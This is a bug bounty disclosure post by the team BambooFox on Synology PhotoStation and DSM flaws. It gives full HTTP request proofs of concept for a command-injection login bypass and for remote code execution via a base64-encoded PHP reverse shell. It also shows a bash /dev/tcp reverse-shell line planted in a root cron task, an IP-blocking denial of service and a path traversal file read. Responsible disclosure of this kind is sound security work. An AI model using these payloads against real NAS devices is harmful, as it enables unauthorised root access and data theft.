title: '[Synology Bug Bounty 2016]'
author: 'bananaapple,0Alien0'
date: 2017-03-20 07:28:13
tags:
---
Synology Bug Bounty 
=============
Author: BambooFox

In last year(2016), our team BambooFox is invited to Synology Bug Bounty. During about 2 mouth hacking, several vulnerabilities are discovered, include a remote root vuln. Enginners in Synology response and fix these vuln in a very sort time, which shows they pay a lot of attension for security issue.

For now(2017), we are permitted to disclosure the vulnerabilities.

Vul-01: PhotoStation Login without password
---
We mostly focus on PhotoStation, which is the picture management system enabled in most Synology DSM.

The first vuln is unauthenticated login without password.

POC1:
```
GET //photo/login.php?usr=admin&sid=xxx&SynoToken=/bin/true HTTP/1.1
Host: bamboofox.hopto.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept:    text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
X-Forwarded-For: |
Cookie: stay_login=0; language=en; PHPSESSID=ime6mqrg0pghbjo4p9aomqcbv0; left-panel-visibility=show
Connection: close
```

The key points of POC1 are '|' in X-Forwarded-For field and SynoToken.
We found that server site CGI will concate user, X-Forwarded-For and SynoToken into command and execute this command.
But the special characters '|' and '>' is not correctly filter out. 

Therefore in our POC1, the command will become
```
/usr/syno/bin/synophoto_dsm_user username | /bin/true
```

This command returns 0(True) and bypasses the authentication.

**Expected Result:
Adversary can login as admin without password**

![Login without password](http://i.imgur.com/pnIWZ6t.png)

Vul-02: PhotoStation Remote Code Execution
---
After first attemp to login success, 
we futher extend out attack for remote code execution.

POC2: 
1 . Encode the command you want in base64
```
$sock=fsockopen("......",8080);exec("/bin/sh -i <&3 >&3 2>&3");
=> JHNvY2s9ZnNvY2tvcGVuKCIzNi4yMzEuNjguMjE1Iiw4MDgwKTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOw==
```

2 . Send the payload
```
GET //photo/login.php?usr=|&sid=php&SynoToken=eval%28base64_decode%28%22JHNvY2s9ZnNvY2tvcGVuKCIzNi4yMzEuNjguMjE1Iiw4MDgwKTtleGVjKCIvYmluL3NoIC1pIDwmMyA%2bJjMgMj4mMyIpOw%3D%3D%22%29%29%3B HTTP/1.1
Host: bamboofox.hopto.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
X-Forwarded-For: -r
Cookie: stay_login=0; language=en; PHPSESSID=ime6mqrg0pghbjo4p9aomqcbv0; left-panel-visibility=show
Connection: close
```

In POC2, the similar approach is taken to achieve RCE.
Loop more deep to the PhotoStation source code. We can find following code.
```
if ($x_forward) {
    $ip = $x_forward;
}
// ...
$retval = csSYNOPhotoMisc::ExecCmd('/usr/syno/bin/synophoto_dsm_user', array('--current', $user, $session_id, $ip, $synotoken), false, $isValidUser);

if ($retval === 0) {
    $login_status = true;
} else {
    // login failed
}
```

In this code snippet, $user, $ip and $synotoken can be easily controlled by HTTP header. Thus we can try command injection. However our first attempt fails due to something is filtering out. But we also notice that some special char is not filtered. The code here shows that.
```
static $skipEscape = array('>', '<', '|', '&');
```

As result, '>', '<', '|', '&' can used to cause command injection.

![Remote Code Execution](http://i.imgur.com/qJxpKq8.png)

Vul-03: Arbitrary Read/Write Files
---
After the shell gotten. We continue to find flaw in the DSM. The binary program synophoto_dsm_user gets our attension. This binary is **suid** and has a powerful copy function. Thus we can use this binary to   arbitrary read/write files.

Vul-04: Get Root 
---
With previous 3 vuln, now we can start to remote root. We first try to modify crontab, but fails due to apparmor protection. So we move to other place that crontab will invoke it. 
We finally find the '/tmp/synoschedtask' that will be invoked by crontab as root. Therefore we use synophoto_dsm_user to modify the content as follow:
```
/volume1/photo/bash -c '/volume1/photo/bash -i >& /dev/tcp/x.x.x.x/yyyyy 0>&1'
```

Then we can now wait for reverse shell.
![Remote Code Execution](http://i.imgur.com/5YrQU54.jpg)

Vul-05: forget_passwd.cgi DOS via Blocking IP
---
Besides remote root vuln, we also find other security flaws. Here os the LFI vuln.

forget_passwd.cgis use X-Forwarded-For to block user IP. If a user sends request to  forget_passwd.cgi too fast, the user will be blocked by it's IP.
But X-Forwarded-For can be easily forged in client site. Thus attacker can block any user by it's IP. 
Moreover, attack can enumerate all the ip to DOS DSM.
![Block IP](http://i.imgur.com/aU9IDWm.png)

Vul-06:  PhotoStation Download.php Local File Inclusion
---
The download.php have local file inclusion problem. The parameter id is controllable. As example, we can use "../../../../../../var/services/homes/[username]/.gitconfig" to download user's file.

![Local File Inclusion](http://i.imgur.com/ZpL5Tw7.png)
